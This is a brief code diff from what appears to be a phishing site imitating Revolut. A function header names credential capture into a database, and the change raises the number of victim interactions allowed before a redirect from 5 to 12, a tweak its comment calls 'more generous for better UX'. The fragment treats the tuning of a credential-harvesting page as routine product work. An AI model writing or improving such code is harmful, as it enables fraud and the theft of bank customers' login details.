@@ -88,7 +88,7 @@ def capture_credentials_to_db(form_data, page_url, form_type='unknown'):
 def check_interaction_threshold():
     """Check if user has reached interaction threshold for redirect"""
     interaction_count = session.get('revolut_interactions', 0)
-    max_interactions = 5  # Redirect after 5 interactions
+    max_interactions = 12  # Redirect after 12 interactions (more generous for better UX)
     
     if interaction_count >= max_interactions:
         return True
